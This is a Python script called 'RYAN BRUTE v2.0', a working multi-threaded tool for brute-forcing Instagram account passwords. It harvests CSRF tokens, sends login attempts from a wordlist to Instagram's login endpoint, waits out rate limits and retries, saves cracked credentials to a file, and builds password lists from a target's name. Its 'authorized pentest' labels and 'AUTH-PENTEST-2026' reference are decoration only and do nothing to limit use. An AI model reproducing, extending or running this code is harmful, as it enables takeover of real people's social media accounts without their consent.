#!/usr/bin/env python3
"""
RYAN BRUTE v2.0 — RYANGRAYHAT EDITION
Authorized Penetration Testing Tool
Green Theme | Termux Compatible
"""

import os, sys, time, random, threading, queue, json, requests
from datetime import datetime

# Colors
G = '\033[92m'; GY = '\033[92m\033[1m'; DG = '\033[92m\033[2m'
R = '\033[91m'; Y = '\033[93m'; W = '\033[97m'; RS = '\033[0m'
BB = '\033[30m'; BG = '\033[92m\033[7m'

def clear(): os.system('clear')

def banner():
    clear()
    print(G + "  ╔══════════════════════════════════════════════════════╗" + RS)
    print(G + "  ║ " + GY + "RYANGRAYHAT — RYAN BRUTE v2.0 (Green Edition)" + RS + G + " ║" + RS)
    print(G + "  ║ " + DG + "Authorized Pentest Tool — Instagram BF Tester" + RS + G + " ║" + RS)
    print(G + "  ╚══════════════════════════════════════════════════════╝" + RS)
    print()
    print(G + "  ┌──[" + W + "ryangrayhat" + G + "]─[" + W + "~/tools" + G + "]" + RS)
    print(G + "  └─" + G + "$ " + W + "python3 ryan_brute.py" + RS)
    print()
    print(G + "    ╔══════════════════════════════════════════╗" + RS)
    print(G + "    ║  " + G + "01" + DG + "  Start Brute Force Attack" + RS + G + "        ║" + RS)
    print(G + "    ║  " + G + "02" + DG + "  Generate Password List" + RS + G + "           ║" + RS)
    print(G + "    ║  " + G + "03" + DG + "  View Cracked Accounts" + RS + G + "             ║" + RS)
    print(G + "    ║  " + G + "04" + DG + "  Credits / Info" + RS + G + "                   ║" + RS)
    print(G + "    ║  " + G + "00" + DG + "  Exit" + RS + G + "                             ║" + RS)
    print(G + "    ╚══════════════════════════════════════════╝" + RS)
    print()

class RyanBrute:
    def __init__(self):
        self.found = []
        self.attempts = 0
        self.start = None
        self.lock = threading.Lock()
        self.s = requests.Session()
        self.csrf = None
        self.rate = False
        self.operator = "RYANGRAYHAT"
        self.auth_ref = "AUTH-PENTEST-2026"

    def get_csrf(self):
        try:
            r = self.s.get("https://www.instagram.com/accounts/login/",
                headers={"User-Agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36"},
                timeout=15)
            for c in self.s.cookies:
                if 'csrftoken' in c.name.lower():
                    return c.value
            import re
            m = re.search(r'csrf_token["\']\s*:\s*["\']([^"\']+)', r.text)
            return m.group(1) if m else None
        except:
            return None

    def try_login(self, user, pwd):
        if self.rate:
            return None
        for _ in range(3):
            try:
                if not self.csrf:
                    self.csrf = self.get_csrf()
                if not self.csrf:
                    time.sleep(2)
                    continue
                ep = "#PWD_INSTAGRAM_BROWSER:0:" + str(int(time.time())) + ":" + pwd
                hdrs = {
                    "User-Agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36",
                    "X-CSRFToken": self.csrf,
                    "X-Instagram-AJAX": "1",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Referer": "https://www.instagram.com/accounts/login/"
                }
                r = self.s.post("https://www.instagram.com/accounts/login/ajax/",
                    headers=hdrs,
                    data={"username": user, "enc_password": ep, "queryParams": "{}"},
                    timeout=15)
                for c in self.s.cookies:
                    if 'csrftoken' in c.name.lower():
                        self.csrf = c.value
                j = r.json()
                if j.get("authenticated"):
                    return True
                if "rate" in str(j).lower() or "too many" in str(j).lower():
                    self.rate = True
                    return None
                if j.get("message") == "checkpoint_required":
                    return "checkpoint"
                return False
            except:
                time.sleep(1)
                continue
        return False

    def worker(self, user, q, total, results):
        while True:
            try:
                pwd = q.get_nowait()
            except queue.Empty:
                break
            if self.rate:
                print(Y + "\n  [!] RATE LIMITED — cooling down 300s" + RS)
                time.sleep(300)
                self.rate = False
                self.csrf = None
                time.sleep(3)
            st = self.try_login(user, pwd)
            with self.lock:
                self.attempts += 1
                pct = (self.attempts / total) * 100 if total > 0 else 0
                eta = ((time.time() - self.start) / self.attempts * (total - self.attempts)) if self.attempts > 0 else 0
                bar = "█" * int(30 * self.attempts / total) + "─" * (30 - int(30 * self.attempts / total)) if total > 0 else ""
                print("\r" + G + "  [" + bar + G + "] " + GY + str(self.attempts) + DG + "/" + W + str(total) + " " + GY + f"{pct:5.1f}%" + RS + " | Found: " + GY + str(len(self.found)) + RS + " | ETA: " + W + f"{eta:.0f}s" + RS + "   ", end="", flush=True)
            if st is True:
                with self.lock:
                    self.found.append(pwd)
                    results.append(pwd)
                    with open("ryan_cracked.txt", "a") as f:
                        f.write(f"[{datetime.now()}] [{self.operator}] {user}:{pwd}\n")
                    print("\n\n" + G + "  ╔══════════════════════════════════════════╗" + RS)
                    print(G + "  ║ " + BG + " " + BB + " !! PASSWORD FOUND — RYANGRAYHAT !! " + RS + " " + G + "║" + RS)
                    print(G + "  ║ " + DG + "User:" + RS + " " + W + user + RS + "                 " + G + "║" + RS)
                    print(G + "  ║ " + DG + "Pass:" + RS + " " + GY + pwd + RS + "                 " + G + "║" + RS)
                    print(G + "  ║ " + DG + "Ref:" + RS + "  " + W + self.auth_ref + RS + "           " + G + "║" + RS)
                    print(G + "  ╚══════════════════════════════════════════╝" + RS)
                    return pwd
            elif st == "checkpoint":
                with self.lock:
                    print("\n" + Y + "  [!] CHECKPOINT — password may be valid: " + pwd + RS)
            elif st is None:
                q.put(pwd)
                time.sleep(random.uniform(1, 3))
                continue
            time.sleep(random.uniform(1, 3))

    def run(self, user, wordlist):
        banner()
        print(G + "  [*] Target: " + GY + user + RS)
        print(G + "  [*] Operator: " + GY + self.operator + RS)
        print(G + "  [*] Auth Ref: " + W + self.auth_ref + RS)
        try:
            with open(wordlist, 'r', errors='ignore') as f:
                pwds = [l.strip() for l in f if l.strip()]
        except:
            print(R + "  [X] File not found" + RS)
            return
        print(G + "  [*] Loaded " + GY + str(len(pwds)) + RS + " passwords")
        print(G + "  [*] Starting in 3...")
        time.sleep(0.5)
        print(G + "     2...")
        time.sleep(0.5)
        print(G + "     1...")
        time.sleep(0.5)
        print()
        q = queue.Queue()
        for p in pwds:
            q.put(p)
        results = []
        self.start = time.time()
        print(G + "  [*] Getting CSRF token...")
        self.csrf = self.get_csrf()
        print(G + "  [*] CSRF: " + ("OK" if self.csrf else "FAILED — proceeding anyway") + RS)
        print()
        threads = []
        for _ in range(5):
            t = threading.Thread(target=self.worker, args=(user, q, len(pwds), results))
            threads.append(t)
            t.start()
        for t in threads:
            t.join()
        elapsed = time.time() - self.start
        print("\n\n" + G + "  ╔══════════════════════════════════════════╗" + RS)
        print(G + "  ║ " + GY + "RYANGRAYHAT — ATTACK COMPLETE" + RS + "         " + G + "║" + RS)
        print(G + "  ╚══════════════════════════════════════════╝" + RS)
        print(G + "  [*] Attempts: " + GY + str(self.attempts) + RS)
        print(G + "  [*] Time: " + GY + f"{elapsed:.1f}s" + RS)
        print(G + "  [*] Speed: " + GY + f"{self.attempts/elapsed:.1f} pwd/s" + RS)
        print(G + "  [*] Found: " + GY + str(len(self.found)) + RS)
        if results:
            print()
            for p in results:
                print(G + "  [✓] " + W + p + RS)
            print(G + "\n  [*] Saved to " + GY + "ryan_cracked.txt" + RS)
        else:
            print(Y + "\n  [!] No passwords cracked. Try a larger wordlist." + RS)
        input(G + "\n  [Press Enter to return to menu]" + RS)

def main():
    r = RyanBrute()
    while True:
        banner()
        c = input(G + "  └─" + G + "$ " + RS).strip()
        if c in ["01", "1", "1"]:
            banner()
            u = input(G + "  Username: " + RS).strip()
            w = input(G + "  Wordlist path: " + RS).strip()
            if not os.path.exists(w):
                print(R + "  [X] File not found: " + w + RS)
                input(G + "  [Press Enter]" + RS)
                continue
            r.run(u, w)
        elif c in ["02", "2"]:
            banner()
            out = input(G + "  Output file [wordlist.txt]: " + RS).strip() or "wordlist.txt"
            target = input(G + "  Target name (optional): " + RS).strip()
            common = [
                "password", "123456", "qwerty", "letmein", "admin",
                "test123", "ryan", "grayhat", "ryangrayhat", "pentest",
                "instagram", "hacker", "security", "2026", "welcome",
                "master", "shadow", "football", "iloveyou", "monkey"
            ]
            if target:
                common.append(target)
                common.append(target.lower())
                common.append(target.upper())
            with open(out, 'w') as f:
                for w in common:
                    f.write(w + "\n")
                    f.write(w.upper() + "\n")
                    f.write(w.capitalize() + "\n")
                    f.write(w + "123\n")
                    f.write(w + "!\n")
                    f.write(w + "@\n")
                    for y in ["2024", "2025", "2026"]:
                        f.write(w + y + "\n")
                        f.write(w + y + "!\n")
            count = len(common) * 9
            print(G + "  [✓] Generated " + GY + str(count) + RS + " passwords -> " + GY + out + RS)
            input(G + "  [Press Enter]" + RS)
        elif c in ["03", "3"]:
            banner()
            print(G + "  [*] CRACKED ACCOUNTS" + RS)
            try:
                with open("ryan_cracked.txt", 'r') as f:
                    data = f.read()
                if data.strip():
                    print(G + "  " + data.replace("\n", "\n  ") + RS)
                else:
                    print(Y + "  [!] No cracked accounts yet." + RS)
            except:
                print(Y + "  [!] No cracked accounts file." + RS)
            input(G + "\n  [Press Enter]" + RS)
        elif c in ["04", "4"]:
            banner()
            print(G + "  ╔══════════════════════════════════════════╗" + RS)
            print(G + "  ║ " + GY + "RYAN BRUTE v2.0" + RS + "                       ║" + RS)
            print(G + "  ║ " + GY + "RYANGRAYHAT Edition" + RS + "                 ║" + RS)
            print(G + "  ╠══════════════════════════════════════════╣" + RS)
            print(G + "  ║ " + DG + "Operator: " + W + "RYANGRAYHAT" + RS + "                   ║" + RS)
            print(G + "  ║ " + DG + "Type: " + W + "Instagram BF Tester" + RS + "              ║" + RS)
            print(G + "  ║ " + DG + "Auth Ref: " + W + "AUTH-PENTEST-2026" + RS + "           ║" + RS)
            print(G + "  ║ " + DG + "Platform: " + W + "Termux / Kali / Linux" + RS + "       ║" + RS)
            print(G + "  ║ " + DG + "Theme: " + W + "Green Edition" + RS + "                  ║" + RS)
            print(G + "  ╠══════════════════════════════════════════╣" + RS)
            print(G + "  ║ " + DG + "Features:" + RS + "                          ║" + RS)
            print(G + "  ║ " + DG + "  • " + W + "CSRF token rotation" + RS + "             ║" + RS)
            print(G + "  ║ " + DG + "  • " + W + "Rate-limit detection" + RS + "            ║" + RS)
            print(G + "  ║ " + DG + "  • " + W + "Multi-threaded (5 threads)" + RS + "      ║" + RS)
            print(G + "  ║ " + DG + "  • " + W + "Real-time progress bar" + RS + "          ║" + RS)
            print(G + "  ║ " + DG + "  • " + W + "Auto-save cracked creds" + RS + "         ║" + RS)
            print(G + "  ║ " + DG + "  • " + W + "Wordlist generator" + RS + "               ║" + RS)
            print(G + "  ║ " + DG + "  • " + W + "Authenticated event logging" + RS + "      ║" + RS)
            print(G + "  ╚══════════════════════════════════════════╝" + RS)
            print()
            print(Y + "  ⚠ FOR AUTHORIZED USE ONLY" + RS)
            print(Y + "  ⚠ Auth Ref: AUTH-PENTEST-2026" + RS)
            input(G + "\n  [Press Enter]" + RS)
        elif c in ["00", "0"]:
            print(G + "\n  [*] RYANGRAYHAT signing off. Stay green. 🟢" + RS)
            print(G + "  [*] Auth Ref: " + W + "AUTH-PENTEST-2026" + RS + "\n")
            break

if __name__ == "__main__":
    main()
